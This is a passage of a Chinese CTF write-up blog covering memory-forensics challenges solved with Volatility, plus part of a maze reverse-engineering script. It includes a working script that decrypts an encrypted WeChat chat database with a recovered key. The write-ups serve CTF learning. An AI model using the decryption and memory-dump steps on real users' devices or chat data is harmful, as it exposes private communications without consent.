C:\Windows</span><br><span class="line">NtProductType   NtProductWinNt</span><br><span class="line">NtMajorVersion  6</span><br><span class="line">NtMinorVersion  1</span><br><span class="line">PE MajorOperatingSystemVersion  6</span><br><span class="line">PE MinorOperatingSystemVersion  1</span><br><span class="line">PE Machine      34404</span><br><span class="line">PE TimeDateStamp        Mon Jul 13 23:40:48 2009</span><br></pre></td></tr></table></figure></div>

<p>查看进程</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">vol -f secret.raw windows.pslist</span><br><span class="line">Volatility 3 Framework 2.4.1</span><br><span class="line">Progress:  100.00               PDB scanning finished</span><br><span class="line">PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime</span><br><span class="line"> ExitTime       File output</span><br><span class="line"></span><br><span class="line">4       0       System  0xfa8018d4b9e0  68      442     N/A     False   2022-08-13 11:46:15.000000</span><br><span class="line"> N/A    Disabled</span><br><span class="line">224     4       smss.exe        0xfa80265f99f0  2       29      N/A     False   2022-08-13 11:46:15.000000     N/A     Disabled</span><br><span class="line">300     288     csrss.exe       0xfa801ab36b30  8       342     0       False   2022-08-13 11:46:15.000000     N/A     Disabled</span><br><span class="line">348     288     wininit.exe     0xfa8024e80340  3       76      0       False   2022-08-13 11:46:15.000000     N/A     Disabled</span><br><span class="line">356     340     csrss.exe       0xfa8018e127c0  7       219     1       False   2022-08-13 11:46:15.000000     N/A     Disabled</span><br><span class="line">396     340     winlogon.exe    0xfa8019fa5060  6       118     1       False   2022-08-13 11:46:15.000000     N/A     Disabled</span><br><span class="line">440     348     services.exe    0xfa801ab2ab30  10      174     0       False   2022-08-13 11:46:15.000000     N/A     Disabled</span><br><span class="line">448     348     lsass.exe       0xfa801abc7060  6       511     0       False   2022-08-13 11:46:15.000000     N/A     Disabled</span><br><span class="line">456     348     lsm.exe 0xfa801a482910  10      138     0       False   2022-08-13 11:46:15.000000</span><br><span class="line"> N/A    Disabled</span><br><span class="line">560     440     svchost.exe     0xfa801ac4c7c0  11      352     0       False   2022-08-13 11:46:15.000000     N/A     Disabled</span><br><span class="line">624     440     svchost.exe     0xfa8020ba1790  7       231     0       False   2022-08-13 11:46:15.000000     N/A     Disabled</span><br><span class="line">676     440     svchost.exe     0xfa801ac8eb30  20      379     0       False   2022-08-13 11:46:15.000000     N/A     Disabled</span><br><span class="line">768     440     svchost.exe     0xfa801acbb290  22      450     0       False   2022-08-13 11:46:15.000000     N/A     Disabled</span><br><span class="line">844     440     svchost.exe     0xfa801acccb30  48      838     0       False   2022-08-13 11:46:15.000000     N/A     Disabled</span><br><span class="line">912     676     audiodg.exe     0xfa801ad22b30  7       129     0       False   2022-08-13 11:46:15.000000     N/A     Disabled</span><br><span class="line">1000    440     svchost.exe     0xfa801ad512f0  13      266     0       False   2022-08-13 11:46:16.000000     N/A     Disabled</span><br><span class="line">304     440     svchost.exe     0xfa801ad66b30  17      369     0       False   2022-08-13 11:46:16.000000     N/A     Disabled</span><br><span class="line">360     440     spoolsv.exe     0xfa801adfe780  13      265     0       False   2022-08-13 11:46:16.000000     N/A     Disabled</span><br><span class="line">1064    440     svchost.exe     0xfa801ae54b30  22      305     0       False   2022-08-13 11:46:16.000000     N/A     Disabled</span><br><span class="line">1236    440     taskhost.exe    0xfa801aeae140  11      204     1       False   2022-08-13 11:46:16.000000     N/A     Disabled</span><br><span class="line">1324    768     dwm.exe 0xfa801af42670  5       71      1       False   2022-08-13 11:46:16.000000</span><br><span class="line"> N/A    Disabled</span><br><span class="line">1336    1312    explorer.exe    0xfa801af46b30  31      724     1       False   2022-08-13 11:46:16.000000     N/A     Disabled			#此处有个文件资源管理器的进程</span><br><span class="line">1392    440     QQProtect.exe   0xfa801af79060  15      196     0       True    2022-08-13 11:46:16.000000     N/A     Disabled</span><br><span class="line">1108    440     SearchIndexer.  0xfa801ae22b30  13      639     0       False   2022-08-13 11:46:22.000000     N/A     Disabled</span><br><span class="line">1452    1108    SearchProtocol  0xfa801af01b30  7       310     0       False   2022-08-13 11:46:22.000000     N/A     Disabled</span><br><span class="line">1616    1108    SearchFilterHo  0xfa801aefab30  6       93      0       False   2022-08-13 11:46:22.000000     N/A     Disabled</span><br><span class="line">828     1336    MRCv120.exe     0xfa801abf8060  14      282     1       True    2022-08-13 11:48:02.000000     N/A     Disabled</span><br></pre></td></tr></table></figure></div>

<p>搜索桌面文件</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">vol -f secret.raw windows.filescan |grep Desktop</span><br><span class="line">0x6c9c6290 100.0\Users\Admin\Links\Desktop.lnk  216</span><br><span class="line">0x6d526f20      \Users\Admin\Desktop\MRCv120.exe        216</span><br><span class="line">0x72e8bf20      \Users\Admin\Desktop\EULAaccepted.dat   216</span><br><span class="line">0x7d80a7d0      \Users\Admin\Desktop\gift.jpg   216#这三个文件比较重要</span><br><span class="line">0x7d84af20      \Users\Admin\Desktop\hint.txt   216#</span><br><span class="line">0x7d84e350      \Users\Admin\Desktop\secret.zip 216#</span><br><span class="line">0x7da64360      \ProgramData\Microsoft\Windows\Start Menu\Programs\Accessories\Desktop.ini      216</span><br><span class="line">0x7da66c70      \Users\Public\Desktop\desktop.ini       216</span><br><span class="line">0x7da66dc0      \Users\Admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Desktop.ini      216</span><br><span class="line">0x7da68070      \Users\Admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Maintenance\Desktop.ini      216</span><br><span class="line">0x7da68c00      \Users\Admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Accessibility\Desktop.ini                                                                                          216</span><br><span class="line">0x7da6af20      \Users\Admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\System Tools\Desktop.ini                                                                                           216</span><br><span class="line">0x7da6dab0      \ProgramData\Microsoft\Windows\Start Menu\Programs\Maintenance\Desktop.ini      216</span><br><span class="line">0x7da6fab0      \ProgramData\Microsoft\Windows\Start Menu\Programs\Accessories\Accessibility\Desktop.ini        216</span><br><span class="line">0x7da6fc00      \ProgramData\Microsoft\Windows\Start Menu\Programs\Accessories\System Tools\Desktop.ini 216</span><br><span class="line">0x7da704a0      \ProgramData\Microsoft\Windows\Start Menu\Programs\Accessories\Tablet PC\Desktop.ini    216</span><br><span class="line">0x7da7f310      \Users\Admin\Desktop    216</span><br><span class="line">0x7da7f4e0      \Users\Admin\Desktop    216</span><br><span class="line">0x7da80740      \Users\Public\Desktop\Glary Tracks Eraser.lnk   216</span><br><span class="line">0x7da81670      \Users\Public\Desktop   216</span><br><span class="line">0x7da81b70      \Users\Public\Desktop   216</span><br><span class="line">0x7dae0420      \Users\Admin\Desktop\wechat.txt 216</span><br><span class="line">0x7dc47bc0      \ProgramData\Microsoft\Windows\Start Menu\Programs\Accessories\Remote Desktop Connection.lnk    216</span><br><span class="line">0x7de7c070      \Users\Admin\Desktop\MRCv120.exe        216</span><br><span class="line">0x7dfa9150      \Users\Admin\Desktop\MRCC206.tmp        216</span><br><span class="line">0x7e144d20      \Users\Admin\Desktop\desktop.ini        216</span><br><span class="line">0x7e614420      \Users\Admin\Desktop    216</span><br><span class="line">0x7ee47230      \Users\Public\Desktop\Firefox.lnk       216</span><br><span class="line">0x7f1e6ad0      \Users\Admin\Desktop\111.raw    216</span><br></pre></td></tr></table></figure></div>

<p>dump三个文件,发现hint.txt无法dump</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">vol -f secret.raw windows.dump --physaddr 0x7d80a7d0</span><br><span class="line">vol -f secret.raw windows.dump --physaddr 0x7d84af20</span><br><span class="line">vol -f secret.raw windows.dump --physaddr 0x7d84e350</span><br></pre></td></tr></table></figure></div>

<p>通过diskgenius打开该镜像获取文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307231630764.png"
                      alt="image-20230723163030671"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307231630255.png"
                      alt="image-20230723163054165"
                ></p>
<p>成功找到桌面文件</p>
<p>hint.txt为is _ not （此处有个空格16进制数为0x20）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307231631911.png"
                      alt="image-20230723163146810"
                ></p>
<p>其余两个文件为一个压缩包和一个jpg</p>
<p>jpg明显左下角有字，更改长宽</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20230723163840020.png"
                      alt="image-20230723163840020"
                ></p>
<p>显示Nothing is more important than your life!是Passwd</p>
<p>输入压缩包后错误，根据hint文件中的提示，将空格转化为_</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">In [<span class="number">2</span>]: <span class="string">&quot;Nothing is more important than your life!&quot;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">Out[<span class="number">2</span>]: <span class="string">&#x27;Nothing_is_more_important_than_your_life!&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>解压后文件显示</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">A gift for You:  wHeMscYvTluyRvjf5d7AEX5K4VlZeU2IiGpKLFzek1Q=</span><br></pre></td></tr></table></figure></div>

<p>通过搜索wp发现是wechat数据库加密的key</p>
<p>wechat.txt就是被加密的数据库,直接通过diskgenius无法正常提取，通过Volatility dump下来(需要将.dat文件改成.db文件)</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vol -f secret.raw windows.filescan |grep wechat</span></span><br><span class="line">0x7dae0420 100.0\Users\Admin\Desktop\wechat.txt 216</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vol -f secret.raw windows.dump --physaddr 0x7dae0420</span></span><br><span class="line">Volatility 3 Framework 2.4.1</span><br><span class="line">Progress:  100.00               PDB scanning finished</span><br><span class="line">Cache   FileObject      FileName        Result</span><br><span class="line"></span><br><span class="line">DataSectionObject       0x7dae0420      wechat.txt      file.0x7dae0420.0xfa8019afc6c0.DataSectionObject.wechat.txt.dat</span><br></pre></td></tr></table></figure></div>

<p>然后通过搜索wechat解密脚本<a class="link"   href="https://www.cnblogs.com/zysgmzb/p/16599501.html" >2022巅峰极客初赛 Misc wp - zysgmzb - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib, hmac, ctypes</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">SQLITE_FILE_HEADER = <span class="built_in">bytes</span>(<span class="string">&quot;SQLite format 3&quot;</span>,encoding=<span class="string">&#x27;ASCII&#x27;</span>) + <span class="built_in">bytes</span>(<span class="number">1</span>)<span class="comment">#文件头</span></span><br><span class="line">IV_SIZE = <span class="number">16</span></span><br><span class="line">HMAC_SHA1_SIZE = <span class="number">20</span></span><br><span class="line">KEY_SIZE = <span class="number">32</span></span><br><span class="line">DEFAULT_PAGESIZE = <span class="number">4096</span> <span class="comment">#4048数据 + 16IV + 20 HMAC + 12</span></span><br><span class="line">DEFAULT_ITER = <span class="number">64000</span></span><br><span class="line"><span class="comment">#yourkey</span></span><br><span class="line">password = b64decode(<span class="string">b&quot;wHeMscYvTluyRvjf5d7AEX5K4VlZeU2IiGpKLFzek1Q=&quot;</span>)<span class="comment">#获取的key</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;dump下来的db文件地址&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    blist = f.read()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(blist))</span><br><span class="line"></span><br><span class="line">salt = blist[:<span class="number">16</span>]<span class="comment">#微信将文件头换成了盐</span></span><br><span class="line">key = hashlib.pbkdf2_hmac(<span class="string">&#x27;sha1&#x27;</span>, password, salt, DEFAULT_ITER, KEY_SIZE)<span class="comment">#获得Key</span></span><br><span class="line"></span><br><span class="line">first = blist[<span class="number">16</span>:DEFAULT_PAGESIZE]<span class="comment">#丢掉salt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># import struct</span></span><br><span class="line">mac_salt = <span class="built_in">bytes</span>([x^<span class="number">0x3a</span> <span class="keyword">for</span> x <span class="keyword">in</span> salt])</span><br><span class="line">mac_key = hashlib.pbkdf2_hmac(<span class="string">&#x27;sha1&#x27;</span>, key, mac_salt, <span class="number">2</span>, KEY_SIZE)</span><br><span class="line"></span><br><span class="line">hash_mac = hmac.new(mac_key ,digestmod = <span class="string">&#x27;sha1&#x27;</span>)<span class="comment">#用第一页的Hash测试一下</span></span><br><span class="line">hash_mac.update(first[:-<span class="number">32</span>])</span><br><span class="line">hash_mac.update(<span class="built_in">bytes</span>(ctypes.c_int(<span class="number">1</span>)))</span><br><span class="line"><span class="comment"># hash_mac.update(struct.pack(&#x27;=I&#x27;,1))</span></span><br><span class="line"><span class="keyword">if</span> (hash_mac.digest() == first[-<span class="number">32</span>:-<span class="number">12</span>]):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Correct Password&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Wrong Password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">blist = [blist[i:i+DEFAULT_PAGESIZE] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(DEFAULT_PAGESIZE,<span class="built_in">len</span>(blist),DEFAULT_PAGESIZE)]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;输出的db文件地址&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(SQLITE_FILE_HEADER)<span class="comment">#写入文件头</span></span><br><span class="line">    t = AES.new(key ,AES.MODE_CBC ,first[-<span class="number">48</span>:-<span class="number">32</span>])</span><br><span class="line">    f.write(t.decrypt(first[:-<span class="number">48</span>]))</span><br><span class="line">    f.write(first[-<span class="number">48</span>:])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blist:</span><br><span class="line">            t = AES.new(key ,AES.MODE_CBC ,i[-<span class="number">48</span>:-<span class="number">32</span>])</span><br><span class="line">            f.write(t.decrypt(i[:-<span class="number">48</span>]))</span><br><span class="line">            f.write(i[-<span class="number">48</span>:])</span><br></pre></td></tr></table></figure></div>

<p>成功输出</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20230724005411976.png"
                      alt="image-20230724005411976"
                ></p>
<p>直接搜一下flag</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">strings a.db |grep flag</span><br><span class="line">klllflag&#123;The_Is_Y0ur_prize&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Misc</category>
      </categories>
  </entry>
  <entry>
    <title>鹏城杯 2022简单取证</title>
    <url>/2023/07/28/CTF%20WP/Misc/%E9%B9%8F%E5%9F%8E%E6%9D%AF%202022%E7%AE%80%E5%8D%95%E5%8F%96%E8%AF%81/</url>
    <content><![CDATA[<p>[<a class="link"   href="https://www.nssctf.cn/problem/2411" >鹏城杯 2022]简单取证 | NSSCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>附件是一个raw文件,一般是内存镜像用vol3看一下</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vol -f file.raw windows.info</span></span><br><span class="line">Volatility 3 Framework 2.4.1</span><br><span class="line">Progress:  100.00               PDB scanning finished</span><br><span class="line">Variable        Value</span><br><span class="line"></span><br><span class="line">Kernel Base     0x804d8000</span><br><span class="line">DTB     0xb37000</span><br><span class="line">Symbols file:///home/wrwrw/.local/lib/python3.11/site-packages/volatility3/symbols/windows/ntkrnlpa.pdb/30B5FB31AE7E4ACAABA750AA241FF331-1.json.xz</span><br><span class="line">Is64Bit False</span><br><span class="line">IsPAE   True</span><br><span class="line">layer_name      0 WindowsIntelPAE</span><br><span class="line">memory_layer    1 FileLayer</span><br><span class="line">KdDebuggerDataBlock     0x80546ae0</span><br><span class="line">NTBuildLab      2600.xpsp.080413-2111</span><br><span class="line">CSDVersion      3</span><br><span class="line">KdVersionBlock  0x80546ab8</span><br><span class="line">Major/Minor     15.2600</span><br><span class="line">MachineType     332</span><br><span class="line">KeNumberProcessors      1</span><br><span class="line">SystemTime      2022-06-20 13:00:12</span><br><span class="line">NtSystemRoot    C:\WINDOWS</span><br><span class="line">NtProductType   NtProductWinNt</span><br><span class="line">NtMajorVersion  5</span><br><span class="line">NtMinorVersion  1</span><br><span class="line">PE MajorOperatingSystemVersion  5</span><br><span class="line">PE MinorOperatingSystemVersion  1</span><br><span class="line">PE Machine      332</span><br><span class="line">PE TimeDateStamp        Sun Apr 13 18:31:06 2008</span><br></pre></td></tr></table></figure></div>

<p>是windows xp系统的，中文版的桌面叫做“桌面”而不是“Desktop”,直接搜索对应的文件</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vol -f file.raw windows.filescan |grep 桌面</span></span><br><span class="line">0x2072ea0  100.0\Documents and Settings\Administrator\桌面\51763-4FE71AEA7-20220620-130010.raw  112</span><br><span class="line">0x20dd608       \Documents and Settings\Administrator\桌面\DumpIt.exe   112</span><br><span class="line">0x2162df8       \Documents and Settings\Administrator\桌面      112</span><br><span class="line">0x224e028       \Documents and Settings\Administrator\桌面      112</span><br><span class="line">0x2325028       \Documents and Settings\Administrator\桌面\secret.jpg   112</span><br><span class="line">0x23ac178       \Documents and Settings\Administrator\桌面      112</span><br><span class="line">0x23d5960       \Documents and Settings\Administrator\桌面\DumpIt.exe   112</span><br><span class="line">0x240d8d8       \Documents and Settings\All Users\桌面  112</span><br></pre></td></tr></table></figure></div>

<p>有个secret.jpg，dump下来</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vol -f file.raw windows.dump --physaddr 0x2325028</span></span><br></pre></td></tr></table></figure></div>

<p>发现该文件其实是base64文本的文本文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307281952101.png"
                      alt="image-20230728195235912"
                ></p>
<p>解码后发现PK字样，猜测是压缩包直接用脚本解压后发现无法解压，用010editor打开，发现50 4b 03 04在最后面而且是反过来的，更改脚本进行反序输出</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;file.0x2325028.0x81fc6610.DataSectionObject.secret.jpg&quot;</span>,<span class="string">&quot;rb&quot;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    arr=f.read()</span><br><span class="line">    arr=b64decode(arr)[::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;a.zip&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> g:</span><br><span class="line">        g.write(arr)</span><br></pre></td></tr></table></figure></div>

<p>成功输出zip，但发现有密码</p>
<p>对raw文件用strings搜索相应字符串,发现一个疑似密码的字段</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">strings file.raw |grep  password</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">以上省略</span></span><br><span class="line">echo password = 62b041223bb9a</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">以下省略</span></span><br></pre></td></tr></table></figure></div>

<p>解压后是一个文本,都是以数对形式存在，猜测是坐标，用于打印像素,且该文本的末尾是349 349 猜测是350*350的图片</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307281957439.png"
                      alt="image-20230728195731372"
                ></p>
<p>脚本如下</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;a~\flag.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pixels=f.read().splitlines()</span><br><span class="line">width = <span class="number">350</span></span><br><span class="line">height = <span class="number">350</span></span><br><span class="line">result=[]</span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pixels:</span><br><span class="line">    tmp=i.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    img.putpixel((<span class="built_in">int</span>(tmp[<span class="number">0</span>]),<span class="built_in">int</span>(tmp[<span class="number">1</span>])),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))<span class="comment">#以白色打印对应像素,因为默认背景为黑色</span></span><br><span class="line"><span class="comment"># 保存图片到本地</span></span><br><span class="line">img.save(<span class="string">r&#x27;a~\output.png&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>成功输出png，是一个二维码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307282003576.png"
                      alt="image-20230728200300506"
                ></p>
<p>扫描后得到了flag</p>
]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Misc</category>
      </categories>
  </entry>
  <entry>
    <title>HNCTF 2022 WEEK3mazes</title>
    <url>/2023/07/18/CTF%20WP/Re/HNCTF%202022%20WEEK3mazes/</url>
    <content><![CDATA[<p>脚本参考<a class="link"   href="https://panda0s.top/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-100mazes/" >美团CTF: 100mazes - Pandaos’s blog (panda0s.top) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>主要函数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307181026204.png"
                      alt="image-20230718102654109"
                ></p>
<p>此处的地址offset是物理地址，也就是文件内数据的地址，不是ida反编译中的地址</p>
<p>用010editor查看其物理地址为0x810</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307181036326.png"
                      alt="image-20230718103649242"
                ></p>
<p>通过第一个迷宫函数sub_140001460的地址(0x140001460)与入口点的虚拟地址(0x140001410)相减获取与0x810的相对地址</p>
<p>再将相对地址与实际的入口地址相加获取第一个迷宫函数物理地址</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">In [2]: hex(0x140001460-0x140001410+0x810)</span><br><span class="line">Out[2]: &#x27;0x860&#x27;#物理地址</span><br></pre></td></tr></table></figure></div>

<p>可以通过capstone反汇编器读取文件进行依次读取迷宫map1，读取的反汇编代码是带制表符\t的所以也需要带上</p>
<p>通过调试发现：</p>
<p>\tmov\tdword ptr [rsp				是对map1，和起点的值进行赋值,每次读取rsp后面的值即可</p>
<p>\tmov\teax, dword ptr [rip		 是对方向(wdsa对应的方向字母如第一个函数中是3tkA)进行赋值</p>
<p>\tlea\trcx, [rip							是对map2进行赋值,直接读取后面跟的地址中625个字符即可</p>
<p>此处相对地址有点难以换算，我直接用的是他们之间的地址规律</p>
<p>每个迷宫函数相差</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307181051178.png"
                      alt="image-20230718105137152"
                ></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">In [3]: 0x140003F20-0x140001460</span><br><span class="line">Out[3]: 10944</span><br></pre></td></tr></table></figure></div>

<p>每个map2相差</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307181052138.png"
                      alt="image-20230718105224111"
                ><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307181052145.png"
                      alt="image-20230718105231120"
                ></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">In [4]: 0x140A859E0-0x140A85010</span><br><span class="line">Out[4]: 2512</span><br></pre></td></tr></table></figure></div>

<p>搜索第一个迷宫函数中map2的物理地址，之后再每个函数+2512即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307181054673.png"
                      alt="image-20230718105402620"
                ></p>
<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> Cs</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">offset,tmp</span>):</span><br><span class="line">    data_bin = <span class="built_in">open</span>(<span class="string">r&#x27;E:\QQsavefile\MobileFile\mazes.exe&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()<span class="comment">#exe路径</span></span><br><span class="line">    data = data_bin[offset: offset+<span class="number">10921</span>]<span class="comment">#每个函数长度为10921</span></span><br><span class="line">    md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line">    inscnt = <span class="number">0</span></span><br><span class="line">    inscnt2 = <span class="number">0</span></span><br><span class="line">    map1 = []</span><br><span class="line">    map2 = []</span><br><span class="line">    map3 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(data, offset):</span><br><span class="line">        ins = <span class="string">&quot;0x%x:\t%s\t%s&quot;</span> % (i.address, i.mnemonic, i.op_str)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;\tmov\tdword ptr [rsp&#x27;</span> <span class="keyword">in</span> ins <span class="keyword">or</span> <span class="string">&#x27;\tmov\teax, dword ptr [rip&#x27;</span> <span class="keyword">in</span> ins:</span><br><span class="line">            <span class="keyword">if</span> inscnt &lt; <span class="number">625</span>:<span class="comment">#先读625个迷宫字符，作为map1</span></span><br><span class="line">                map1.append(<span class="built_in">int</span>(i.op_str.split(<span class="string">&#x27;, &#x27;</span>)[<span class="number">1</span>], <span class="number">16</span>))</span><br><span class="line">                inscnt += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> inscnt2 &lt; <span class="number">2</span>:<span class="comment">#625个字符读满后再遇到&#x27;\tmov\tdword ptr [rsp&#x27;就是赋值迷宫起始点的地址</span></span><br><span class="line">                map3.append(<span class="built_in">int</span>(i.op_str.split(<span class="string">&#x27;, &#x27;</span>)[<span class="number">1</span>], <span class="number">16</span>))</span><br><span class="line">                inscnt2 += <span class="number">1</span> </span><br><span class="line">            <span class="keyword">elif</span> inscnt&lt;<span class="number">629</span>:<span class="comment">#最后遇到&#x27;\tmov\teax, dword ptr [rip&#x27;，就对方向赋值</span></span><br><span class="line">                off1 =i.address+<span class="built_in">int</span>(i.op_str.split(<span class="string">&#x27;, &#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;+&#x27;</span>)[<span class="number">1</span>].replace(<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">                map1_data = data_bin[<span class="number">0xa76098</span>+tmp*<span class="number">5</span>: <span class="number">0xa76098</span>+<span class="number">4</span>+tmp*<span class="number">5</span> ] <span class="comment">#方向数组存在规律，每个值相差5          </span></span><br><span class="line">                map1=map1+(<span class="built_in">list</span>(map1_data))</span><br><span class="line">                inscnt+=<span class="number">4</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;\tlea\trcx, [rip&#x27;</span> <span class="keyword">in</span> ins:<span class="comment">#遇到这个字符串对map2进行赋值</span></span><br><span class="line">            map2_data = data_bin[tmp*<span class="number">2512</span>+<span class="number">0xa82610</span>: tmp*<span class="number">2512</span>+<span class="number">0xa82610</span>+ <span class="number">4</span> * <span class="number">625</span>]<span 